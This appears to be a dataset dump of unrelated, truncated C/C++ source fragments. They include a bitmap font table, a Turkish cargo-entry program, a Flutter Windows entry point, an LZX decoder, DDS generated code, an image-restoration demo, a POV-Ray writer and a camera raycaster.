LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\r\n  * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\r\n  * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\r\n  *\r\n  ******************************************************************************\r\n  */\r\n\r\n/* Includes ------------------------------------------------------------------*/\r\n#include \"fonts.h\"\r\n\r\n// \r\n//  Font data for Courier New 12pt\r\n// \r\n\r\nconst uint8_t Font12_Table[] PROGMEM = \r\n{\r\n  // @0 ' ' (7 pixels wide)\r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n\r\n  // @12 '!' (7 pixels wide)\r\n  0x00, //        \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x00, //        \r\n  0x00, //        \r\n  0x10, //    #   \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n\r\n  // @24 '\"' (7 pixels wide)\r\n  0x00, //        \r\n  0x6C, //  ## ## \r\n  0x48, //  #  #  \r\n  0x48, //  #  #  \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n\r\n  // @36 '#' (7 pixels wide)\r\n  0x00, //        \r\n  0x14, //    # # \r\n  0x14, //    # # \r\n  0x28, //   # #  \r\n  0x7C, //  ##### \r\n  0x28, //   # #  \r\n  0x7C, //  ##### \r\n  0x28, //   # #  \r\n  0x50, //  # #   \r\n  0x50, //  # #   \r\n  0x00, //        \r\n  0x00, //        \r\n\r\n  // @48 '$' (7 pixels wide)\r\n  0x00, //        \r\n  0x10, //    #   \r\n  0x38, //   ###  \r\n  0x40, //  #     \r\n  0x40, //  #     \r\n  0x38, //   ###  \r\n  0x48, //  #  #  \r\n  0x70, //  ###   \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x00, //        \r\n  0x00, //        \r\n\r\n  // @60 '%' (7 pixels wide)\r\n  0x00, //        \r\n  0x20, //   #    \r\n  0x50, //  # #   \r\n  0x20, //   #    \r\n  0x0C, //     ## \r\n  0x70, //  ###   \r\n  0x08, //     #  \r\n  0x14, //    # # \r\n  0x08, //     #  \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n\r\n  // @72 '&' (7 pixels wide)\r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x18, //    ##  \r\n  0x20, //   #    \r\n  0x20, //   #    \r\n  0x54, //  # # # \r\n  0x48, //  #  #  \r\n  0x34, //   ## # \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n\r\n  // @84 ''' (7 pixels wide)\r\n  0x00, //        \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n  0x00, //        \r\n\r\n  // @96 '(' (7 pixels wide)\r\n  0x00, //        \r\n  0x08, //     #  \r\n  0x08, //     #  \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x08, //     #  \r\n  0x08, //     #  \r\n  0x00, //        \r\n\r\n  // @108 ')' (7 pixels wide)\r\n  0x00, //        \r\n  0x20, //   #    \r\n  0x20, //   #    \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x10, //    #   \r\n  0x20, //   #    \r\n  0x20, //   #  ",
    "#include \"kargo.h\"\n#include \"kargoALici.h\"\n#include <iostream> \nusing namespace std;\n\nint main()\n{\n    cout<<\"Kargo sistemine ho\u015f geldiniz.\"<<endl;\n    cout<<\"Kargo bilgilerini giriniz.\"<<endl;\n    cout<<\"Kargo ID: \";\n    int kargoId;\n    cin>>kargoId;\n    cout<<\"Urun Ad: \";\n    string urunAd;\n    cin>>urunAd;\n    cout<<\"Urun Adet: \";\n    int urunAdet;\n    cin>>urunAdet;\n    cout<<\"Urun Agirlik: \";\n    int urunAgirlik;\n    cin>>urunAgirlik;\n    cout<<\"Teslimat zamani: \";\n    string teslimatZamani;\n    cin>>teslimatZamani;\n    cout<<\"Kargo Notu: \";\n    string kargoNotu;\n    cin>>kargoNotu;\n    cout<<\"Alici Ad: \";\n    string aliciAd;\n    cin>>aliciAd;\n    string aliciAdres;\n    cout<<\"Alici Adres: \";\n    cin>>aliciAdres;\n    cout<<\"Alici Sehir: \";\n    string aliciSehir;\n    cin>>aliciSehir;\n    cout<<\"Alici Tel: \";\n    string aliciTel;\n    cin>>aliciTel;\n    cout<<\"Kargo bilgileri girildi.\"<<endl;\n    \n    Kargo kargo(kargoId,urunAd,urunAdet,urunAgirlik,teslimatZamani,kargoNotu,aliciAd,aliciAdres,aliciSehir,aliciTel);\n    kargo.genelKargoBilgisi();\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"hello_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// LzxDecoder.cpp\r\n\r\n#include \"StdAfx.h\"\r\n\r\n#include <string.h>\r\n\r\n// #define SHOW_DEBUG_INFO\r\n\r\n#ifdef SHOW_DEBUG_INFO\r\n#include <stdio.h>\r\n#define PRF(x) x\r\n#else\r\n#define PRF(x)\r\n#endif\r\n\r\n#include \"../../../C/Alloc.h\"\r\n\r\n#include \"LzxDecoder.h\"\r\n\r\nnamespace NCompress {\r\nnamespace NLzx {\r\n\r\nstatic void x86_Filter(Byte *data, UInt32 size, UInt32 processedSize, UInt32 translationSize)\r\n{\r\n  const UInt32 kResidue = 10;\r\n  if (size <= kResidue)\r\n    return;\r\n  size -= kResidue;\r\n  \r\n  Byte save = data[(size_t)size + 4];\r\n  data[(size_t)size + 4] = 0xE8;\r\n  \r\n  for (UInt32 i = 0;;)\r\n  {\r\n    const Byte *p = data + i;\r\n    for (;;)\r\n    {\r\n      if (*p++ == 0xE8) break;\r\n      if (*p++ == 0xE8) break;\r\n      if (*p++ == 0xE8) break;\r\n      if (*p++ == 0xE8) break;\r\n    }\r\n\r\n    i = (UInt32)(p - data);\r\n\r\n    if (i > size)\r\n      break;\r\n    {\r\n      Int32 v = GetUi32(p);\r\n      Int32 pos = (Int32)((Int32)1 - (Int32)(processedSize + i));\r\n      i += 4;\r\n      if (v >= pos && v < (Int32)translationSize)\r\n      {\r\n        v += (v >= 0 ? pos : translationSize);\r\n        SetUi32(p, v);\r\n      }\r\n    }\r\n  }\r\n\r\n  data[(size_t)size + 4] = save;\r\n}\r\n\r\n\r\nCDecoder::CDecoder(bool wimMode):\r\n    _win(NULL),\r\n    _keepHistory(false),\r\n    _skipByte(false),\r\n    _wimMode(wimMode),\r\n    _numDictBits(15),\r\n    _unpackBlockSize(0),\r\n    _x86_buf(NULL),\r\n    _x86_translationSize(0),\r\n    KeepHistoryForNext(true),\r\n    NeedAlloc(true),\r\n    _unpackedData(NULL)\r\n{\r\n}\r\n\r\nCDecoder::~CDecoder()\r\n{\r\n  if (NeedAlloc)\r\n    ::MidFree(_win);\r\n  ::MidFree(_x86_buf);\r\n}\r\n\r\nHRESULT CDecoder::Flush()\r\n{\r\n  if (_x86_translationSize != 0)\r\n  {\r\n    Byte *destData = _win + _writePos;\r\n    UInt32 curSize = _pos - _writePos;\r\n    if (KeepHistoryForNext)\r\n    {\r\n      if (!_x86_buf)\r\n      {\r\n        // we must change it to support another chunk sizes\r\n        const size_t kChunkSize = (size_t)1 << 15;\r\n        if (curSize > kChunkSize)\r\n          return E_NOTIMPL;\r\n        _x86_buf = (Byte *)::MidAlloc(kChunkSize);\r\n        if (!_x86_buf)\r\n          return E_OUTOFMEMORY;\r\n      }\r\n      memcpy(_x86_buf, destData, curSize);\r\n      _unpackedData = _x86_buf;\r\n      destData = _x86_buf;\r\n    }\r\n    x86_Filter(destData, (UInt32)curSize, _x86_processedSize, _x86_translationSize);\r\n    _x86_processedSize += (UInt32)curSize;\r\n    if (_x86_processedSize >= ((UInt32)1 << 30))\r\n      _x86_translationSize = 0;\r\n  }\r\n \r\n  return S_OK;\r\n}\r\n\r\n\r\nUInt32 CDecoder::ReadBits(unsigned numBits) { return _bitStream.ReadBitsSmall(numBits); }\r\n\r\n#define RIF(x) { if (!(x)) return false; }\r\n\r\nbool CDecoder::ReadTable(Byte *levels, unsigned numSymbols)\r\n{\r\n  {\r\n    Byte levels2[kLevelTableSize];\r\n    for (unsigned i = 0; i < kLevelTableSize; i++)\r\n      levels2[i] = (Byte)ReadBits(kNumLevelBits);\r\n    RIF(_levelDecoder.Build(levels2));\r\n  }\r\n  \r\n  unsigned i = 0;\r\n  do\r\n  {\r\n    UInt32 sym = _levelDecoder.Decode(&_bitStream);\r\n    if (sym <= kNumHuffmanBits)\r\n    {\r\n      int delta = (int)levels[i] - (int)sym;\r\n      delta += (delta < 0) ? (kNumHuffmanBits + 1) : 0;\r\n      levels[i++] = (Byte)delta;\r\n      continue;\r\n    }\r\n    \r\n    unsigned num;\r\n    Byte symbol;\r\n\r\n    if (sym < kLevelSym_Same)\r\n    {\r\n      sym -= kLevelSym_Zero1;\r\n      num = kLevelSym_Zero1_Start + ((unsigned)sym << kLevelSym_Zero1_NumBits) +\r\n          (unsigned)ReadBits(kLevelSym_Zero1_NumBits + sym);\r\n      symbol = 0;\r\n    }\r\n    else if (sym == kLevelSym_Same)\r\n    {\r\n      num = kLevelSym_Same_Start + (unsigned)ReadBits(kLevelSym_Same_NumBits);\r\n      sym = _levelDecoder.Decode(&_bitStream);\r\n      if (sym > kNumHuffmanBits)\r\n        return false;\r\n      int delta = (int)levels[i] - (int)sym;\r\n      delta += (delta < 0) ? (kNumHuffmanBits + 1) : 0;\r\n      symbol = (Byte)delta;\r\n    }\r\n    else\r\n      return false;\r\n\r\n    unsigned limit = i + num;\r\n    if (limit > numSymbols)\r\n      return false;\r\n\r\n    do\r\n      levels[i++] = symbol;\r\n    while (i < limit);\r\n  }\r\n  while (i < numSymbols);\r\n\r\n  return true;\r\n}\r\n\r\n\r\nbool CDecoder::ReadTables(void)\r\n{\r\n  {\r\n    if (_skipByte)\r\n    {\r\n      if (_bitStream.DirectReadByte() != 0)\r\n        return false;\r\n    }\r\n\r\n    _bitStream.NormalizeBig();\r\n\r\n    unsigned blockType = (unsigned)ReadBits(kBlockType_NumBits);\r\n    if (blockType > kBlockType_Uncompressed)\r\n      return false;\r\n    \r\n    _unpackBlockSize = (1 << 15);\r\n    if (!_wimMode || ReadBits(1) == 0)\r\n    {\r\n      _unpackBlockSize = ReadBits(16);\r\n      // wimlib supports chunks larger than 32KB (unsupported my MS wim).\r\n      if (!_wimMode || _numDictBits >= 16)\r\n      {\r\n        _unpackBlockSize <<= 8;\r\n        _unpackBlockSize |= ReadBits(8);\r\n      }\r\n    }\r\n\r\n    PRF(printf(\"\\nBlockSize = %6d   %s  \", _unpackBlockSize, (_pos & 1) ? \"@@@\" : \"   \"));\r\n\r\n    _isUncompressedBlock = (blockType == kBlockType_Uncompressed);\r\n\r\n    _skipByte = false;\r\n\r\n    if (_isUncompressedBlock)\r\n    {\r\n      _skipByte = ((_unpackBlockSize & 1) != 0);\r\n\r\n      PRF(printf(\" UncompressedBlock \"));\r\n      if (_unpack",
    "//******************************************************************\n// \n//  Generated by IDL to C++ Translator\n//  \n//  File name: BBox_Dcps.cpp\n//  Source: ssafy_msgs\\msg\\BBox_.idl\n//  Generated: timestamp removed to make the build reproducible\n//  OpenSplice 6.9.190403OSS\n//  \n//******************************************************************\n\n#include \"BBox_Dcps.h\"\n\n#if DDS_USE_EXPLICIT_TEMPLATES\ntemplate class DDS_DCPSUVLSeq < ssafy_msgs::msg::dds_::BBox_, struct BBox_Seq_uniq_>;\n#endif\n\nconst char * ssafy_msgs::msg::dds_::BBox_TypeSupportInterface::_local_id = \"IDL:ssafy_msgs/msg/dds_/BBox_TypeSupportInterface:1.0\";\n\nssafy_msgs::msg::dds_::BBox_TypeSupportInterface_ptr ssafy_msgs::msg::dds_::BBox_TypeSupportInterface::_duplicate (ssafy_msgs::msg::dds_::BBox_TypeSupportInterface_ptr p)\n{\n   if (p) p->m_count++;\n   return p;\n}\n\nDDS::Boolean ssafy_msgs::msg::dds_::BBox_TypeSupportInterface::_local_is_a (const char * _id)\n{\n   if (strcmp (_id, ssafy_msgs::msg::dds_::BBox_TypeSupportInterface::_local_id) == 0)\n   {\n      return true;\n   }\n\n   typedef DDS::TypeSupport NestedBase_1;\n\n   if (NestedBase_1::_local_is_a (_id))\n   {\n      return true;\n   }\n\n   return false;\n}\n\nssafy_msgs::msg::dds_::BBox_TypeSupportInterface_ptr ssafy_msgs::msg::dds_::BBox_TypeSupportInterface::_narrow (DDS::Object_ptr p)\n{\n   ssafy_msgs::msg::dds_::BBox_TypeSupportInterface_ptr result = NULL;\n   if (p && p->_is_a (ssafy_msgs::msg::dds_::BBox_TypeSupportInterface::_local_id))\n   {\n      result = dynamic_cast < ssafy_msgs::msg::dds_::BBox_TypeSupportInterface_ptr> (p);\n      if (result) result->m_count++;\n   }\n   return result;\n}\n\nssafy_msgs::msg::dds_::BBox_TypeSupportInterface_ptr ssafy_msgs::msg::dds_::BBox_TypeSupportInterface::_unchecked_narrow (DDS::Object_ptr p)\n{\n   ssafy_msgs::msg::dds_::BBox_TypeSupportInterface_ptr result;\n   result = dynamic_cast < ssafy_msgs::msg::dds_::BBox_TypeSupportInterface_ptr> (p);\n   if (result) result->m_count++;\n   return result;\n}\n\nconst char * ssafy_msgs::msg::dds_::BBox_DataWriter::_local_id = \"IDL:ssafy_msgs/msg/dds_/BBox_DataWriter:1.0\";\n\nssafy_msgs::msg::dds_::BBox_DataWriter_ptr ssafy_msgs::msg::dds_::BBox_DataWriter::_duplicate (ssafy_msgs::msg::dds_::BBox_DataWriter_ptr p)\n{\n   if (p) p->m_count++;\n   return p;\n}\n\nDDS::Boolean ssafy_msgs::msg::dds_::BBox_DataWriter::_local_is_a (const char * _id)\n{\n   if (strcmp (_id, ssafy_msgs::msg::dds_::BBox_DataWriter::_local_id) == 0)\n   {\n      return true;\n   }\n\n   typedef DDS::DataWriter NestedBase_1;\n\n   if (NestedBase_1::_local_is_a (_id))\n   {\n      return true;\n   }\n\n   return false;\n}\n\nssafy_msgs::msg::dds_::BBox_DataWriter_ptr ssafy_msgs::msg::dds_::BBox_DataWriter::_narrow (DDS::Object_ptr p)\n{\n   ssafy_msgs::msg::dds_::BBox_DataWriter_ptr result = NULL;\n   if (p && p->_is_a (ssafy_msgs::msg::dds_::BBox_DataWriter::_local_id))\n   {\n      result = dynamic_cast < ssafy_msgs::msg::dds_::BBox_DataWriter_ptr> (p);\n      if (result) result->m_count++;\n   }\n   return result;\n}\n\nssafy_msgs::msg::dds_::BBox_DataWriter_ptr ssafy_msgs::msg::dds_::BBox_DataWriter::_unchecked_narrow (DDS::Object_ptr p)\n{\n   ssafy_msgs::msg::dds_::BBox_DataWriter_ptr result;\n   result = dynamic_cast < ssafy_msgs::msg::dds_::BBox_DataWriter_ptr> (p);\n   if (result) result->m_count++;\n   return result;\n}\n\nconst char * ssafy_msgs::msg::dds_::BBox_DataReader::_local_id = \"IDL:ssafy_msgs/msg/dds_/BBox_DataReader:1.0\";\n\nssafy_msgs::msg::dds_::BBox_DataReader_ptr ssafy_msgs::msg::dds_::BBox_DataReader::_duplicate (ssafy_msgs::msg::dds_::BBox_DataReader_ptr p)\n{\n   if (p) p->m_count++;\n   return p;\n}\n\nDDS::Boolean ssafy_msgs::msg::dds_::BBox_DataReader::_local_is_a (const char * _id)\n{\n   if (strcmp (_id, ssafy_msgs::msg::dds_::BBox_DataReader::_local_id) == 0)\n   {\n      return true;\n   }\n\n   typedef DDS::DataReader NestedBase_1;\n\n   if (NestedBase_1::_local_is_a (_id))\n   {\n      return true;\n   }\n\n   return false;\n}\n\nssafy_msgs::msg::dds_::BBox_DataReader_ptr ssafy_msgs::msg::dds_::BBox_DataReader::_narrow (DDS::Object_ptr p)\n{\n   ssafy_msgs::msg::dds_::BBox_DataReader_ptr result = NULL;\n   if (p && p->_is_a (ssafy_msgs::msg::dds_::BBox_DataReader::_local_id))\n   {\n      result = dynamic_cast < ssafy_msgs::msg::dds_::BBox_DataReader_ptr> (p);\n      if (result) result->m_count++;\n   }\n   return result;\n}\n\nssafy_msgs::msg::dds_::BBox_DataReader_ptr ssafy_msgs::msg::dds_::BBox_DataReader::_unchecked_narrow (DDS::Object_ptr p)\n{\n   ssafy_msgs::msg::dds_::BBox_DataReader_ptr result;\n   result = dynamic_cast < ssafy_msgs::msg::dds_::BBox_DataReader_ptr> (p);\n   if (result) result->m_count++;\n   return result;\n}\n\nconst char * ssafy_msgs::msg::dds_::BBox_DataReaderView::_local_id = \"IDL:ssafy_msgs/msg/dds_/BBox_DataReaderView:1.0\";\n\nssafy_msgs::msg::dds_::BBox_DataReaderView_ptr ssafy_msgs::msg::dds_::BBox_DataReaderView::_duplicate (ssafy_msgs::msg::dds_::BBox_DataReaderView_ptr p)\n{\n   if (p) p->m_count++;\n   return p;\n}\n\nDDS::Boolean ssafy_msgs::msg::dds_::BBox_DataReader",
    "#include \"binary_predictor.h\"\n#include \"unblur_predictor.h\"\n#include \"unshadow_predictor.h\"\n#include \"unwrap_predictor.h\"\n#include<opencv2/highgui.hpp>\n\n\nusing namespace cv;\nusing namespace std;\n\n\nint main()\n{\n    UnetCNN binary_model(\"/home/wangbo/doc-undistort/weights/unetcnn.onnx\");   /////\u6ce8\u610f\u6587\u4ef6\u8def\u5f84\u8981\u5199\u5bf9\n    NAF_DPM unblur_model(\"/home/wangbo/doc-undistort/weights/nafdpm.onnx\");\n    GCDRNET unshadow_model(\"/home/wangbo/doc-undistort/weights/gcnet.onnx\", \"/home/wangbo/doc-undistort/weights/drnet.onnx\");\n    UVDocPredictor unwrap_model(\"/home/wangbo/doc-undistort/weights/uvdoc.onnx\");\n\n    vector<string> task_list = {\"unwrap\", \"unshadow\", \"unblur\", \"OpenCvBilateral\"};\n\n    string imgpath = \"/home/wangbo/doc-undistort/images/demo3.jpg\";\n\n    Mat srcimg = imread(imgpath);\n    // Mat out_img = unwrap_model.predict(srcimg);\n\n    Mat out_img = srcimg.clone();\n    for(string task : task_list)\n    {\n        /////switch\u4e0d\u652f\u6301\u5b57\u7b26\u4e32\u8868\u8fbe\u5f0f,\u6240\u4ee5\u7528if else\n        if(task == \"unwrap\")\n        {\n            out_img = unwrap_model.predict(out_img);\n        }\n        else if(task == \"unshadow\")\n        {\n            out_img = unshadow_model.predict(out_img);\n        }\n        else if(task == \"unblur\")\n        {\n            out_img = unblur_model.predict(out_img);\n        }\n        else if(task == \"OpenCvBilateral\")\n        {\n            out_img = OpenCvBilateral(out_img);\n        }\n        else if(task == \"binary\")\n        {\n            out_img = binary_model.predict(out_img);\n        }\n        else\n        {\n            cout << \"task not found\" << endl;\n        }\n        \n    }\n\n    imwrite(\"out.jpg\", out_img);\n    return 0;\n}\n",
    "#include <fstream>\n#include <iostream>\n#include \"../inc/pov/pov_parser.h\"\n#include \"../inc/pov/pov_model.h\"\n#include \"../inc/pov/pov_camera.h\"\n#include \"../inc/pov/pov_lightsource.h\"\n#include \"../inc/pov/pov_background.h\"\n\nusing namespace POV;\nPOVParser::POVParser(){\n\n}\nPOVParser::~POVParser(){\n    for(auto & ptr: objs) delete ptr;\n}\n\nbool POVParser::importObject(const std::string & object_name){\n    POVModel* temp = new POVModel(object_name);\n    objs.push_back(temp);\n    return true;\n}\n\nbool POVParser::importObject(POVModel * pov_model){\n    if(!pov_model) return false;\n    objs.push_back(pov_model);\n    return true;\n}\n\nbool POVParser::setCamera(POVCamera* camera){\n    if(!camera) return false;\n    objs.push_front(camera);\n    return true;\n}\n\nbool POVParser::setLightSource(POVLightSource * lightsource){\n    if(!lightsource) return false;\n    objs.push_front(lightsource);\n    return true;\n}\n\nbool POVParser::parserPOV(const std::string & _file_name) {\n    if(_file_name.substr(_file_name.rfind('.') + 1, 3) != \"pov\"){\n        std::cout << \"parser failed, the file name should be .pov but \" + _file_name << std::endl;\n        return false;\n    } \n    std::ofstream outfile(_file_name, std::ios::out);\n\n    if (!outfile.is_open()) {\n        std::cerr << \"The outfile is not created or opened correctly\" << std::endl;\n        return false;\n    }\n\n    outfile << \"#local Temp_version = version;\\n\";\n    outfile << \"#version 3.7;\\n\";\n    outfile << \"global_settings {\\n\";\n    outfile << \"    max_trace_level 15\\n\";\n    outfile << \"    adc_bailout 0.001\\n\";\n    outfile << \"    assumed_gamma 1\\n\";\n    outfile << \"}\\n\";\n    for(auto & ptr: objs){\n        ptr->parserPOV(outfile);\n    }\n    outfile << \"#version Temp_version;\\n\";\n    // close fd\n    outfile.close();\n    return true;\n}\n\nbool POVParser::setbackground(POVBackGround * bg){\n    if(!bg) return false;\n    objs.push_front(bg);\n    return true;\n}\n\nbool POVParser::addObject(POVObject * obj){\n    if(!obj) return false;\n    this->objs.push_back(obj);\n    return true;\n}\n\nbool POVParser::deleteObject(const std::string & object_name){\n    auto itr = objs.begin();\n    while(itr != objs.end()){\n        if((*itr)->name() == object_name){\n            objs.erase(itr);\n            return true;\n        }\n        itr++;\n    }\n    return false;\n}",
    "/*\n * Copyright (C) 2020, Inria\n * GRAPHDECO research group, https://team.inria.fr/graphdeco\n * All rights reserved.\n *\n * This software is free for non-commercial, research and evaluation use \n * under the terms of the LICENSE.md file.\n *\n * For inquiries contact sibr@inria.fr and/or George.Drettakis@inria.fr\n */\n\n\n#include <boost/filesystem/path.hpp>\n#include <core/system/Vector.hpp>\n#include \"core/raycaster/CameraRaycaster.hpp\"\n\n\nnamespace sibr\n{\n\n\t/*static*/ void\tCameraRaycaster::computePixelDerivatives( const sibr::InputCamera& cam, \n\t\tsibr::Vector3f& dx, sibr::Vector3f& dy, sibr::Vector3f& upLeftOffset )\n\t{\n\t\tsibr::Vector3f dir = cam.dir();\n\t\tsibr::Vector3f up = cam.up();\n\t\tfloat aspect = cam.aspect();\n\n\t\tsibr::Vector2f screenWorldSize;\n\t\t{ \n\t\t\t// screenWorldSize.y = 2*tan(fov/2) because screenDist = 1 (indeed\n\t\t\t// we use normalized cam.dir() to build this derivative)\n\t\t\tfloat heightWorldSize = 2.f*tanf(cam.fovy()/2.f);\n\t\t\tscreenWorldSize = sibr::Vector2f( heightWorldSize*aspect, heightWorldSize ); \n\t\t}\n\n\t\tsibr::Vector3f right = cross(cam.dir(), up);\n\t\tsibr::Vector3f rowSize = right*screenWorldSize[0];\n\t\tsibr::Vector3f colSize = -up*screenWorldSize[1];\n\n\t\tdx = rowSize / (float)cam.w();\n\t\tdy = colSize / (float)cam.h();\n\n\t\tupLeftOffset = dir - rowSize/2.f - colSize/2.f;\n\t\t//upLeftOffset = upLeftOffset + dx/2.f + dy/2.f;\t// Used to start from the center of a pixel\n\t\tupLeftOffset += cam.position();\n\t}\n\n\tvoid CameraRaycaster::computeClippingPlanes(const sibr::Mesh & mesh, std::vector<InputCamera::Ptr>& cams, std::vector<sibr::Vector2f> & nearsFars)\n\t{\n\t\t\n\t\tnearsFars.clear();\n\t\tsibr::Raycaster raycaster;\n\t\traycaster.init();\n\t\tsibr::Mesh::Ptr localMesh = mesh.invertedFacesMesh2();\n\t\traycaster.addMesh(*localMesh);\n\t\tSIBR_LOG << \" [CameraRaycaster] computeAutoClippingPlanes() : \" << std::flush;\n\n\t\tint deltaPix = 15;\n\n\t\tnearsFars.resize(cams.size());\n\n\t\t#pragma omp parallel for\n\t\tfor (int cam_id = 0; cam_id < (int)cams.size(); ++cam_id) {\n\t\t\tsibr::InputCamera & cam = *cams[cam_id];\n\n\t\t\tsibr::Vector3f dx, dy, upLeftOffset;\n\t\t\tsibr::CameraRaycaster::computePixelDerivatives(cam, dx, dy, upLeftOffset);\n\t\t\tsibr::Vector3f camZaxis = cam.dir().normalized();\n\t\t\tfloat maxD = -1.0f, minD = -1.0f;\n\n\t\t\tfor (int i = 0; i < (int)cam.h(); i += deltaPix) {\n\t\t\t\tfor (int j = 0; j < (int)cam.w(); j += deltaPix) {\n\t\t\t\t\tsibr::Vector3f worldPos = ((float)j + 0.5f)*dx + ((float)i + 0.5f)*dy + upLeftOffset;\n\t\t\t\t\tsibr::Vector3f dir = (worldPos - cam.position()).normalized();\n\n\t\t\t\t\tsibr::RayHit hit = raycaster.intersect(sibr::Ray(cam.position(), dir));\n\n\t\t\t\t\tif (!hit.hitSomething()) { continue; }\n\n\t\t\t\t\tfloat dist = hit.dist();\n\n\t\t\t\t\tfloat clipDist = dist * std::abs(dir.dot(camZaxis));\n\n\t\t\t\t\tmaxD = (maxD<0 || clipDist > maxD ? clipDist : maxD);\n\t\t\t\t\tminD = (minD<0 || clipDist < minD ? clipDist : minD);\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tfloat znear = 0.5f*minD;\n\t\t\tfloat zfar = 2.0f*maxD;\n\n\t\t\twhile (zfar / znear < 100.0f) {\n\t\t\t\tzfar *= 1.1f;\n\t\t\t\tznear *= 0.9f;\n\t\t\t}\n\n\t\t\tcam.znear(znear);\n\t\t\tcam.zfar(zfar);\n\n\t\t\tnearsFars[cam_id] = sibr::Vector2f(znear, zfar);\n\n\t\t\tstd::cout << cam_id << \" \" << std::flush;\n\t\t}\n\t\tstd::cout << \" done.\" << std::endl;\n\n\t\t\n\t}\n\n\n\tsibr::Vector3f CameraRaycaster::computeRayDir( const sibr::InputCamera& cam, const sibr::Vector2f & pixel )\n\t{\n\t\tsibr::Vector3f dx, dy, upLeftOffset;\n\t\tCameraRaycaster::computePixelDerivatives(cam, dx, dy, upLeftOffset);\n\n\t\tsibr::Vector3f worldPos = pixel.x()*dx + pixel.y()*dy + upLeftOffset; //at dist 1 from cam center\n\t\treturn (worldPos - cam.position()).normalized();\n\t}\n\n\tbool\tCameraRaycaster::init( void )\n\t{\n\t\treturn _raycaster.init();\n\t}\n\n\tvoid\tCameraRaycaster::addMesh( const sibr::Mesh& mesh )\n\t{\n\t\t_raycaster.addMesh(mesh);\n\t}\n\n\tvoid\tCameraRaycaster::castForEachPixel( const sibr::InputCamera& cam, ICameraRaycasterProcessor* processors[], uint nbProcessors, const std::string& optLogMsg )\n\t{\n\t\t//SIBR_PROFILESCOPE;\n\n\t\t// Check there is no NULL process\n\t\tfor (uint i = 0; i < nbProcessors; ++i)\n\t\t\tif (processors[i] == nullptr)\n\t\t\tSIBR_ERR << \"camera-raycaster process NULL detected\" << std::endl;\n\n\t\tsibr::Vector3f dx, dy, upLeftOffset;\n\t\tCameraRaycaster::computePixelDerivatives(cam, dx, dy, upLeftOffset);\n\n\t\t//sibr::LoadingProgress\tprogress(cam.w()*cam.h(), optLogMsg);\n\t\t(void)optLogMsg;\n\n\t\t// For each pixel of the camera's image\n\t\tfor (uint py = 0; py < cam.h(); ++py)\n\t\t{\n\t\t\tfor (uint px = 0; px < cam.w(); ++px)\n\t\t\t{ \n\t\t\t\t//progress.walk();\n\t\t\t\tsibr::Vector3f worldPos = (float)px*dx + (float)py*dy + upLeftOffset;\n\t\t\t\t// Cast a ray\n\t\t\t\tsibr::Vector3f dir =  worldPos - cam.position();\n\t\t\t\tRayHit hit = _raycaster.intersect(Ray( cam.position(), dir));\n\n\t\t\t\tfor (uint i = 0; i < nbProcessors; ++i)\n\t\t\t\t\tprocessors[i]->onCast(px, py, hit);\n\t\t\t}\n\t\t}\n\n\t}\n\n\tRaycastingCamera::RaycastingCamera(const sibr::InputCamera & cam) : sibr::InputCamera(cam) {\n\t\tCameraRaycaster::computePixelDerivatives(*this, dx, dy, upLeftOffsetMinusPos);\n\t\tupLeftOffsetMinusPos -= position();\n\n\t\tstd::vector<sibr::Vector2f> corners = {\n\t\t\t{-1,-1",
